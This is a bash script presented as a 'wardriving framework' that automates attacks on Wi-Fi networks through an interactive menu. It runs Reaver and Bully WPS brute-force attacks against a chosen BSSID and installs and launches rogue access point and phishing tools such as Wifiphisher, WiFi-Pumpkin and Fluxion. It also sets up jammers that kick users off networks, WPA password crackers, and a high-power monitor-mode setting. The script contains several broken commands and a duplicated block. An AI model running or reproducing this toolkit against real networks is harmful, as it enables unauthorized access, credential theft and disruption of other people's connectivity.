#!/bin/bash
# SCRIPT: Wardriver2.sh
# REV: Version 2.0a
# PLATFORM: Linux
# AUTHOR: Coenraad
# Wardriving Tool Kit 
# PURPOSE: WAR WIFI 
# 
##########################################################
########### DEFINE FILES AND VARIABLES HERE ##############
##########################################################
# Run as root.
if [[ $EUID -ne 0 ]]; then
    echo -e  "\e[1mMust be ROOT to run  this script!\e[0m"
    echo -e  "\e[1mMust be ROOT to run  this script!\e[0m"
    echo -e  "\e[1mMust be ROOT to run  this script!\e[0m"
    exit 1sud
fi

clear
##########################################################
################ BEGINNING OF MAIN #######################
##########################################################
function see_devices() 
{
    clear 
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Devive Info !!!  \e[0m"
    echo
    iw dev
    sleep 5
    echo
    echo 

}


function info_recon() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Recon and Info !!!  \e[0m"
    echo
    echo "Pick Monitoring Device for RECON"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon:"
    read devices_recon 
    echo -e  "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
}


function show_menus()
{
echo -e  " Install all prereqs "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Type 'install-all' for prereqs for Kali !!! \e[0m"
echo 
echo -e  "PART A : Devices Setup and Recon"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'a' for SHOW WIFI DEVICES !!! \e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'b' for SET DEVICES TO MONITOR !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'c' for RECON: GATHER NETWORK INFO AND TARGET DEVICES !!!\e[0m"

echo 
echo -e  "PART B : Basic Wifi Attacks "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'd' for BASIC REAVER ATTACK !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'e' for BASIC BULLY ATTACK !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'f' for BASIC WIFIPHISER ATTACK - 2 network cards needed - !!!\e[0m"
echo
echo -e  "PART C : Adv. Wifi Attacks "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'xx' for RECON: Installer for some basic wifi tools !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x1' for RECON: Installer PIXIEwps Brute Force wifi tools !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x2' for RECON: Installer WIFITAP WiFi injection tool through tun/tap device !!!\e[0m"
echo
echo -e  "PART D : Rogue Wi-Fi Access Point Attack and Other GUI TOOLS"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '1' for WIFI-PUMPKIN !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '11' for FERN-WIFI-CRACKER !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '12' for GHOST-PHISER !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '13' for WARCARRIER !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '14' for AIRGEDDON !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '15' for ATEAR !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '16' for FRUITYWIFI !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '17' for GERIX-wifi-cracker-2 !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '18' for re-Fluxion !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '19' for h4rpy !!!\e[0m"
echo 
echo -e  "PART E : The Whole Thing "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '21' for Some Great Stuff - Please istall packages One By One !!!\e[0m"
echo 
echo -e  "PART F : Wifi automated wireless attack tool "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '2' for WIFITE - 1 network card , disable other !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '3' for 3vilTwinAttacker!!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '4' for FrankenScript !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '5' for Bettercap SWiss Knife of Networks !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '6' for WifiBRoot of Networks !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit '7' for PSkracker !!!\e[0m"
echo 
echo -e  "PART G  : Wifi disrupt wireless attack tool "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'yy' for DISRUPT: Installer wifijammer wifi disrupt tool \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'y1' for DISRUPT: Installer Wifi Kill disrupt tool - kick people off of wifi \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo 
echo -e  "PART H  : Install NEW Driver for Alfa AWUS1900 "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'd1' for Alfa AWUS1900 Driver Install  \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo
echo -e  "PART I  : PASSWORD CRACKING : Install HASHCAT for cracking  "
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'i1' wpa2own for cracking  \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'i2' WPA2-FritzBox-Pswd-Wordlist-Generator  \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
echo 
echo -e  "\e[32m[-]\e[0m \e[1m   Choose : Hit 'x' to EXIT !!!\e[0m"
echo "Pick Option:" 
}


function install_set()
{
 echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Install Packages FOR KALI !!!  \e[0m"
    echo
    mkdir -p /opt/wifi-wardivn 
    apt update ; apt upgrade
    apt install airmon-ng bully reaver wifiphisher gitclone tcpdump libpcap0.8 libpcap0.8-dev pyrit tshark cowpatty 
    apt -y install tcpdump graphviz imagemagick python3-gnuplot python3-cryptography python3-pyx xterm
    apt -y install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev libgmp3-dev
    pip3 install scapy
    sleep 2   
}


function mode_set()
{
    clear 
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Pick device to set to MONITOR MODE !!!  \e[0m"
    echo
    echo TYPE NAME OF DEVICE FOR MONITOR MODE : 
    read wifi_device 
    ip link set $wifi_device down
    iw $wifi_device set monitor none 
    ip link set $wifi_device up
    iw $wifi_device set txpower fixed 3000
    sleep 5 
}


function basic_reaver() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Reaver Attack !!!  \e[0m"
    echo 
    echo -e  "Very Basic Reaver Attack, use REAVER full tool for differnt switches "
    echo
    apt-get upgrade reaver
    echo "Pick Monitoring Device for RECON and REAVER !!!"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon and Reaver:"
    read devices_recon 
    echo -e  "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
    echo 
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER TARGET BSSID: \e[0m"
    read reaver_b
    echo 
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER CHANNEL : \e[0m"
    read reaver_c
    echo 
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m REAVER ESSID: \e[0m"
    read reaver_e
    echo -e  "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    reaver -i $devices_recon -c $reaver_c -b $reaver_b -e $reaver_e -vvv
    echo 

}

function basic_bully() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Bully Attack !!!  \e[0m"
    echo 
    echo -e  "Very Basic Bully Attack, use BULLY full tool for differnt switches "
    echo
    sudo apt-get upgrade bully
    echo "Pick Monitoring Device for RECON and BULLY !!!"
    iwconfig
    echo 
    echo "Type Device Name Use for Recon and BULLY:"
    read devices_recon 
    echo -e  "\e[1m Must hit ctrl-c to stop session !\e[0m"
    sleep 2
    airodump-ng $devices_recon
    echo 
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m BULLY TARGET BSSID: \e[0m"
    read bully_b

    sleep 2
    bully -b $bully_b $devices_recon
    echo
}

function basic_wifiphisher() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Very Basic Wifiphisher Attack !!!  \e[0m"
    echo 
    echo -e  "!!! Needs Two  Networks Cards !!! "
    echo
    wifiphisher
    echo
}

function WiFi-Pumpkin() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m Framework for Rogue Wi-Fi Access Point Attack !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    apt -y install python3.7-dev libssl-dev libffi-dev build-essential python3.7 
    git clone https://github.com/P0cL4bs/wifipumpkin3.git
    cd wifipumpkin3
    sudo make install
    echo
    echo -e "Starting WiFi-Pumpkin"
    echo
    python3 wifi-pumpkin.py
    clear
}

function wifite() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Wifite An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    wget https://raw.github.com/derv82/wifite/master/wifite.py
    chmod +x wifite.py
    echo
    echo -e "Starting WiFite"
    echo
    ./wifite.py
    clear
}

function ht-wps() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  3vilTwinAttacker !!! An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/wi-fi-analyzer/3vilTwinAttacker.git
    echo
    cd 3vilTwinAttacker
    chmod +x installer.sh
    ./installer.sh --install
    echo
    clear
}


function frankenscript() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  FrankenScript !!! An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/wi-fi-analyzer/FrankenScript.git
    echo
    echo -e "FrankenScript"
    echo
    cd FrankenScript
    chmod +x FrankenScript.sh
    ./FrankenScript.sh
    clear
}


function ghost() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Ghost Phisher.  Wireless and Ethernet security auditing and attack software  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    apt install ghost-phisher
    echo -e "Ghost Phisher"
    echo
    ghost-phisher
    clear
}

function fern() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Wifite An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
    cd Fern-Wifi-Cracker/
    chmod +x execute.py
    echo
    echo -e "Starting Fern-Wifi-Cracker"
    echo
    ./execute.py
    clear
}


function airgeddon() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Airgeddon An automated wireless attack tool.  !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    apt -y  install  hashcat pixiewps dsniff bettercap iw net-tools sslstrip beef unbuffer beef-xss expect sslstrip
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
    cd airgeddon
    chmod +x airgeddon.sh
    echo
    echo -e "Starting  Airgeddon"
    echo
    ./airgeddon.sh
    clear
}

function warcarrier() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Warcarrier is a dashboard for scanning and trolling 802.11 WiFi, 802.15.1 Bluetooth, and GPS.  !!!  \e[0m"
    echo 
    echo -e  "You will need to install Spectools_raw https://www.kismetwireless.net/spectools/ Net::Bluetooth    http://search.cpan.org/~iguthrie/Net-Bluetooth-0.40/Bluetooth.pm"
    echo -e  "Install CPAN Perl"
    echo -e   "HTML::GMap"
    echo -e  "\e[1m Must hit ctrl-c to stop session  and do this for first time, or ignore if done. !\e[0m"
    sleep 5
    echo -e  "!!! Quick Setup !!! "
    apt install  libcurses-ui-perl libjson-xs-perl libnet-bluetooth-perl libgeo-google-mapobject-perl gmap gmap-dbgsym
    pip3 install python2-gmaps
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/dinosec/ubertooth-install.git
    cd ubertooth-install
    chmod +x ubertooth_install.sh
    ./ubertooth_install.sh
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/weaknetlabs/warcarrier.git
    cd warcarrier
    chmod +x warcarrier
    echo
    echo -e "Warcarrier"
    echo
    ./warcarrier
    clear
}

function AtEar() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  AtEar , is a wireless pentest system. !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    sudo apt -y install  aircrack-ng tshark hostapd python-dev python-flask python-paramiko python-psycopg2 python-pyodbc python-sqlite python-pip
    sudo pip2 install python-libnmap
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/NORMA-Inc/AtEar.git
    cd  AtEar/
    chmod +x install.sh
    ./install.sh
    echo -e "Starting  AtEar"
    echo
    iw dev 
    echo 
    echo -e  "Pick Wifi Device"
    read devices_atear
    python3run.py --iface $devices_atear
    clear
}

function fruitywifi() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  FruityWifi is an open source tool to audit wireless networks !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/xtr4nge/FruityWifi.git
    cd  FruityWifi/
    chmod +x install-FruityWifi.sh
    ./install-FruityWiFi.sh 
    echo -e "Starting  FruityWifi"
    /etc/init.d/fruitywifi start
    /etc/init.d/php*-*fpm start
    clear
}

function gerix_wifi() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  GERIX-wifi-cracker-2 is an open source tool to audit wireless networks !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/J4r3tt/gerix-wifi-cracker-2.git
    echo 
    echo -e "GERIX-wifi-cracker-2"
    echo -e "REQUISITES: You need the modules: qt (v.4) LAUNCH:"
    echo -e " To launch the program use:"
    echo -e "$ python gerix.py"
    echo -e "Enjoy!"
    echo -e " to run as root  or sudo "
    echo -e " sudo python /opt/gerix-wifi-cracker-2/gerix.py"
    sleep 10
    clear
}

function fluxion() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m re - Fluxion !!! is an open source tool to audit wireless networks !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone --recursive https://github.com/chinarulezzz/refluxion.git
    cd fluxion 
    ./fluxion.sh
    echo 
    echo -e "re - Fluxion !!!"
    echo -e " To launch the program use:"
    echo -e "$ ./fluxion.sh"
    echo -e "Enjoy!"
    echo -e " to run as root  or sudo "
    echo -e " sudo /opt/fluxion/fluxion"
    echo -e "also check https://github.com/deltaxflux/fluxion-gui.git for GUI"
    sleep 10
    clear
}

function whole_thing() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Some Great Stuff  to audit wireless networks !!!  \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/0x90/wifi-arsenal.git
    echo 
    echo -e "Please install packages One By One "
    echo -e "Be sure what YOU INSTALL!!!!"
    sleep 8
    clear
}

function basic_tools() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer for some basic wifi tools!!! \e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/rockymeza/wifi.git
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Read https://wifi.readthedocs.io/en/latest/ !!!!"
    echo -e "example: wifi -i wlp3s0 list"
    sleep 8
    clear
}

function pixiewps() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer PIXIEwps Brute Force wifi tools !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    apt-get -y install build-essential
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/wiire/pixiewps.git
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Read https://github.com/wiire/pixiewps!!!!"
    sleep 8
    clear
}

function wifitap() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  RECON: Installer WIFITAP WiFi injection tool through tun/tap device !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/GDSSecurity/wifitap.git
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Read https://github.com/GDSSecurity/wifitap!!!!"
    echo -e "Read http://sid.rstack.org/static/articles/w/i/f/Wifitap_EN_9613.html"
    sleep 8
    clear
}


function wifijammer() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  DISRUPT: Installer wifijammer wifi disrupt tool \e[5mB *** USE WITH CAUTION ***  !!!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/DanMcInerney/wifijammer.git
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Read https://github.com/DanMcInerney/wifijammer!!!"
    sleep 8
    clear
}

function wifikill() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  DISRUPT: Installer Wifi Kill disrupt tool - kick people off of wifi \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/roglew/wifikill.git
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Read https://github.com/roglew/wifikill!!!"
    sleep 8
    clear
}

function bettercapinstall() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  Bettercap SWiss Knife of Networks \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev -y 
    go get -u github.com/bettercap/bettercap
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}


function install-rtl8814ad() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  DISRUPT: This will install rtl8814au Drivers and reboot \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    apt install dkms git -y 
    git clone https://github.com/morrownr/8814au.git
    cd 8814au
    ./install-driver.sh
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "CAUTION !!! Driver installed !!! "
    echo -e "Thanks"
    clear
}

function wifibroot() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m WifiBROOT of Networks \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone --recursive https://github.com/hash3liZer/WiFiBroot.git
    pip install scapy==2.4.0
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Syntax:"
    echo -e "$ python wifibroot.py [--mode [modes]] [--options]"
    echo -e "$ python wifibroot.py --mode 2 -i wlan1mon --verbose -d /path/to/list -w pmkid.txt"
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}



function pskracker() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  PSKracker is a collection of WPA/WPA2/WPS  \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/soxrok2212/pskracker
    cd pskracker
    make 
    make install 
    echo 
    echo -e  "Install tools a root in new shell!!!"
    echo -e "Syntax:"
    echo -e "Usage: pskracker <arguments> !!! "
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}

function wpa2own() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  wpa2own passwords with hashcat \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/philcryer/wpa2own.git
    cd wpa2own
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Syntax:"
    echo -e "Usage: wpa2own -h  !!! "
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}


function h4rpy() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m h4rpy  is an automated WPA/WPA2 PSK attack tool  \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/MS-WEB-BN/h4rpy.git
    cd h4rpy
    bash config.sh
    chmod +x h4rpy
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Syntax:"
    echo -e "Usage: ./h4rpy   !!! "
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}


function FritzBox() 
{
    echo
    echo -e  "\e[40;38;5;82m [+] \e[30;48;5;82m  WPA2-FritzBox-Pswd-Wordlist-Generator \e[5m *** USE WIT CAUTION ***  !!!\e[0m"
    echo 
    echo -e  "!!! Quick Setup !!! "
    clear ; cd /opt/wifi-wardivn/
    git clone https://github.com/rwx-777/WPA2-FritzBox-Pswd-Wordlist-Generator.git
    cd WPA2-FritzBox-Pswd-Wordlist-Generator
    # ./WordlistGenerator.perl > Wordlists/allwpa.txt 
    echo 
    echo -e "Install tools a root in new shell!!!"
    echo -e "Syntax:"
    echo -e "Usage: WordlistGenerator.perl > All16Nums-Wordlist.txt !!! "
    echo -e "CAUTION !!! THIS TOOL WILL CAUSE ISSUES --- dont run it at your work!!! "
    echo -e "Enjoy !!!"
    sleep 8
    clear
}

echo -e  "Quick setup!!!"
#apt install airmon-ng bully reaver wifiphisher gitclone tcpdump libpcap0.8 libpcap0.8-dev pyrit tshark cowpatty 
#apt -y install tcpdump graphviz imagemagick python3-gnuplot python3-cryptography python3-pyx xterm
#apt -y install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev libgmp3-dev
#pip3 install scapy 
# Not needed with kali !
clear 
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
echo -e  "\e[40;38;5;82m ******************************** \e[30;48;5;82m \e[0m"
echo -e  "\e[40;38;5;82m                                  \e[30;48;5;82m \e[0m"
echo -e  "\e[40;38;5;82m KALI - WARDriving Framework v.2a \e[30;48;5;82m \e[0m"
echo -e  "\e[40;38;5;82m                                  \e[30;48;5;82m \e[0m"
echo -e  "\e[40;38;5;82m ******************************** \e[30;48;5;82m \e[0m"
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
echo
echo -e  "\e[0m PLEASE Pick a option:"
echo -e  "\e[94m - Steps made easy for Wardriving Linux "
echo -e  "\e[94m - If first time type 'install-all' this will install pre-reqs and make dir under /opt for tools called /opt/wifi-wardivn/"
echo -e  "\e[94m All tools auto update at startup - BETTER! "
echo

echo -e  "Also this script must be executed as ROOT  "
echo -e  "HINT: Configure devices , Plan attack type! , Gather PCAP , Execute Attack! \e[0m"
echo
sleep 10
mkdir  -p /opt/wifi-wardivn/
# rm -fr /opt/wifi-wardivn/
show_menus

read choice
if [ "$choice" == a ]; then
    see_devices
    show_menus
    read choice
fi

if [ "$choice" == b ]; then
    mode_set
    show_menus
    read choice
fi

if [ "$choice" == c ]; then
    info_recon
    show_menus
    read choice
fi

if [ "$choice" == d ]; then
    basic_reaver
    show_menus
    read choice
fi

if [ "$choice" == e ]; then
    basic_bully
    show_menus
    read choice
fi

if [ "$choice" == f ]; then
    basic_wifiphisher
    show_menus
    read choice
fi

if [ "$choice" == 1 ]; then
    WiFi-Pumpkin
    show_menus
    read choice
fi

if [ "$choice" == 11 ]; then
    fern
    show_menus
    read choice
fi

if [ "$choice" == 12 ]; then
    ghost
    show_menus
    read choice
fi

if [ "$choice" == 13 ]; then
    warcarrier
    show_menus
    read choice
fi

if [ "$choice" == 14 ]; then
    airgeddon
    show_menus
    read choice
fi

if [ "$choice" == 15 ]; then
    AtEar
    show_menus
    read choice
fi


if [ "$choice" == 16 ]; then
    fruitywifi
    show_menus
    read choice
fi


if [ "$choice" == 17 ]; then
    gerix_wifi
    show_menus
    read choice
fi

if [ "$choice" == 18 ]; then
    fluxion
    show_menus
    read choice
fi

if [ "$choice" == 19 ]; then
    h4rpy
    show_menus
    read choice
fi

if [ "$choice" == 2 ]; then
    wifite
    show_menus
    read choice
fi

if [ "$choice" == 3 ]; then
    ht-wps
    show_menus
    read choice
fi

if [ "$choice" == 4 ]; then
    frankenscript
    show_menus
    read choice
fi

if [ "$choice" == 5 ]; then
    bettercapinstall
    show_menus
    read choice
fi

if [ "$choice" == 6 ]; then
    wifibroot
    show_menus
    read choice
fi

if [ "$choice" == 7 ]; then
    pskracker
    show_menus
    read choice
fi

if [ "$choice" == 21 ]; then
    whole_thing
    show_menus
    read choice
fi

if [ "$choice" == xx ]; then
    basic_tools
    show_menus
    read choice
fi

if [ "$choice" == x1 ]; then
    pixiewps
    show_menus
    read choice
fi

if [ "$choice" == x2 ]; then
    wifitap
    show_menus
    read choice
fi


if [ "$choice" == yy ]; then
    wifijammer
    show_menus
    read choice
fi

if [ "$choice" == y1 ]; then
    wifikill
    show_menus
    read choice
fi

if [ "$choice" == y1 ]; then
    wifikill
    show_menus
    read choice
fi

if [ "$choice" == i1 ]; then
    wpa2own
    show_menus
    read choice
fi

if [ "$choice" == i2 ]; then
    FritzBox
    show_menus
    read choice
fi

if [ "$choice" == d1 ]; then
    install-rtl8814ad 
fi

if [ "$choice" == install-all ]; then
    clear
    sleep 2
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m This will install packages needed  !!!  \e[0m"
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m Any info contact me : coenraadlamprecht@gmail.com  \e[0m"
    install_set
    show_menus
    read choice
fi

if [ "$choice" == x ]; then
    clear
    sleep 2
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m THANK YOU FOR USING ME !!!  \e[0m"
    echo -e  "\e[40;38;5;82m [*] \e[30;48;5;82m Any info contact me : coenraadlamprecht@gmail.com  \e[0m"
    exit 0
fi


exit 0
